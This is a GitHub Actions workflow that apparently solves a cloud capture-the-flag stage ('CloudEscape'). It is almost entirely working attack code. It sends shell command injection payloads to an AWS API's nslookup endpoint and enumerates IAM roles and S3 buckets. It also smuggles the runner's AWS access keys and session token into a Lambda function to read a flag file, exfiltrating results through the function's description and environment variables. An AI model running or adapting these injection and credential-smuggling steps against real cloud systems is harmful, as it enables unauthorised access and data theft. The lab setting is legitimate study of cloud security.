name: CloudEscape Stage 1 - Debug + Get Flag
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon - VPC endpoints and Lambda role
        run: |
          echo "===== VPC Endpoints ====="
          aws ec2 describe-vpc-endpoints --region us-east-1 2>&1 || true
          
          echo "===== Route Tables ====="
          aws ec2 describe-route-tables --region us-east-1 2>&1 || true
          
          echo "===== Lambda Role ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Role' --output text 2>&1
          
          echo "===== Get lambdaRole policy ====="
          ROLE_NAME=$(aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Role' --output text 2>&1 | sed 's/.*\///')
          echo "Role name: $ROLE_NAME"
          aws iam list-role-policies --role-name "$ROLE_NAME" --region us-east-1 2>&1 || true
          aws iam get-role-policy --role-name "$ROLE_NAME" --policy-name "$(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[0]' --output text 2>/dev/null)" --region us-east-1 2>&1 || true
          
          echo "===== List attached role policies ====="
          aws iam list-attached-role-policies --role-name "$ROLE_NAME" --region us-east-1 2>&1 || true

      - name: Debug - Test if injection + Description update works
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Test 1: Can we update Lambda Description from inside the Lambda?
          echo "=== Test 1: Update Lambda Description (Lambda own role) ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws lambda update-function-configuration --function-name nslookupv2 --description TESTDEBUG123 2>&1"}' 2>&1
          sleep 8
          
          echo "=== Read Description ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          # Test 2: What commands/tools are available in the Lambda?
          echo "=== Test 2: Find aws CLI path ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; find /opt -name aws -type f 2>&1; ls /opt/bin/ 2>&1; ls /opt/aws/bin/ 2>&1; which aws 2>&1; which curl 2>&1; which python3 2>&1"}' 2>&1
          # Can't see output - goes to CloudWatch. Let's write it to Lambda description.
          sleep 3
          
          echo "=== Test 3: Write tool paths to description ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; PATHS=$(find /opt -name aws -type f 2>&1 | head -1); aws lambda update-function-configuration --function-name nslookupv2 --description $PATHS 2>&1"}' 2>&1
          sleep 8
          
          echo "=== Read Description (tool paths) ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          # Test 4: Get Lambda role permissions by injecting iam:get-role-policy
          echo "=== Test 4: Get Lambda role policy ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; POLICY=$(aws iam get-role-policy --role-name lambdaRole --policy-name $(aws iam list-role-policies --role-name lambdaRole --query PolicyNames[0] --output text 2>/dev/null) 2>&1 | head -c 200); aws lambda update-function-configuration --function-name nslookupv2 --description \"$POLICY\" 2>&1"}' 2>&1
          sleep 8
          
          echo "=== Read Description (role policy) ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          # Test 5: Check S3 access with Lambda own role
          echo "=== Test 5: Try s3 ls with Lambda own role ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; RESULT=$(aws s3 ls s3://codec4f26c862a321ef5/ 2>&1); aws lambda update-function-configuration --function-name nslookupv2 --description \"$RESULT\" 2>&1"}' 2>&1
          sleep 8
          
          echo "=== Read Description (s3 ls result) ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1

      - name: Inject cicdRole creds + read flag (single injection)
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Encode cicdRole creds
          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Create a minimal Python script that does everything in one shot
          # Key: must complete within Lambda's 15s timeout
          cat > /tmp/flag_script.py << 'PYEOF'
          import os, sys, base64, boto3, traceback

          # Decode cicdRole creds
          akid = base64.b64decode(os.environ['AKID_B64']).decode()
          skid = base64.b64decode(os.environ['SKID_B64']).decode()
          token = base64.b64decode(os.environ['TOKEN_B64']).decode()

          result = ""

          # Try 1: Use cicdRole creds from within VPC
          try:
              sess = boto3.Session(aws_access_key_id=akid, aws_secret_access_key=skid, aws_session_token=token, region_name='us-east-1')
              s3 = sess.client('s3')
              flag = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().strip()
              result = "FLAG:" + (flag.decode() if isinstance(flag, bytes) else flag)
          except Exception as e:
              result = f"S3_ERR:{e}"

          # Write result to Lambda Description
          try:
              lam = boto3.client('lambda', region_name='us-east-1')
              lam.update_function_configuration(FunctionName='nslookupv2', Description=result[:256])
          except Exception as e:
              try:
                  # Try with cicdRole
                  lam2 = sess.client('lambda')
                  lam2.update_function_configuration(FunctionName='nslookupv2', Description=result[:256])
              except Exception as e2:
                  pass

          # Also write to env var
          try:
              lam3 = boto3.client('lambda', region_name='us-east-1')
              cfg = lam3.get_function_configuration(FunctionName='nslookupv2')
              env = cfg.get('Environment', {}).get('Variables', {})
              env['RESULT'] = result[:256]
              lam3.update_function_configuration(FunctionName='nslookupv2', Environment={'Variables': env})
          except:
              pass
          PYEOF

          SCRIPT_B64=$(base64 -w0 /tmp/flag_script.py)
          
          # SINGLE INJECTION: set env, write script, run it
          # All in one domain value to avoid /tmp persistence issues
          INJECT="export AKID_B64=$AKID_B64; export SKID_B64=$SKID_B64; export TOKEN_B64=$TOKEN_B64; echo $SCRIPT_B64 | base64 -d > /tmp/f.py; python3 /tmp/f.py 2>&1"
          
          # Build JSON payload
          PAYLOAD=$(python3 -c "
          import json
          print(json.dumps({'domain': 'x; $INJECT'}))
          ")
          
          echo "=== Sending single-injection (script + creds inline) ==="
          echo "Payload length: ${#PAYLOAD}"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          echo
          echo "=== Waiting ==="
          sleep 20
          
          echo "=== Read Lambda Description ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          echo "=== Read Lambda Environment ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment.Variables' 2>&1 || true

      - name: Try with presigned URL (single injection)
        if: always()
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Generate presigned URL
          PRESIGNED_URL=$(python3 -c "
          import boto3
          s3 = boto3.client('s3', region_name='us-east-1')
          url = s3.generate_presigned_url('get_object', Params={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}, ExpiresIn=300)
          print(url)
          ")
          
          # Create minimal script: fetch URL, store result in Description
          cat > /tmp/presign_script.py << 'PYEOF'
          import os, sys, urllib.request, boto3, traceback

          url = os.environ['PRESIGNED_URL']
          result = ""

          try:
              resp = urllib.request.urlopen(url, timeout=10)
              flag = resp.read().strip()
              result = "FLAG:" + (flag.decode() if isinstance(flag, bytes) else flag)
          except Exception as e:
              result = f"URL_ERR:{type(e).__name__}:{e}"

          # Write to Lambda Description
          try:
              lam = boto3.client('lambda', region_name='us-east-1')
              lam.update_function_configuration(FunctionName='nslookupv2', Description=result[:256])
          except Exception as e:
              result += f"|LAMBDA_ERR:{e}"
              # At least try to signal via env
              try:
                  lam2 = boto3.client('lambda', region_name='us-east-1')
                  cfg = lam2.get_function_configuration(FunctionName='nslookupv2')
                  env = cfg.get('Environment', {}).get('Variables', {})
                  env['ERR'] = result[:256]
                  lam2.update_function_configuration(FunctionName='nslookupv2', Environment={'Variables': env})
              except:
                  pass
          PYEOF
          
          SCRIPT_B64=$(base64 -w0 /tmp/presign_script.py)
          URL_B64=$(printf '%s' "$PRESIGNED_URL" | base64 -w0)
          
          # SINGLE INJECTION
          INJECT="export PRESIGNED_URL=\$(echo $URL_B64 | base64 -d); echo $SCRIPT_B64 | base64 -d > /tmp/p.py; python3 /tmp/p.py 2>&1"
          
          PAYLOAD=$(python3 -c "
          import json
          print(json.dumps({'domain': 'x; $INJECT'}))
          ")
          
          echo "=== Sending presigned URL injection ==="
          echo "Payload length: ${#PAYLOAD}"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          echo
          sleep 15
          
          echo "=== Read Lambda Description ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          echo "=== Read Lambda Environment ==="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment.Variables' 2>&1 || true

      - name: Final status check
        if: always()
        run: |
          echo "===== Final Lambda config ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
          
          echo "===== Codec bucket ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true
          
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1 || true
          
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true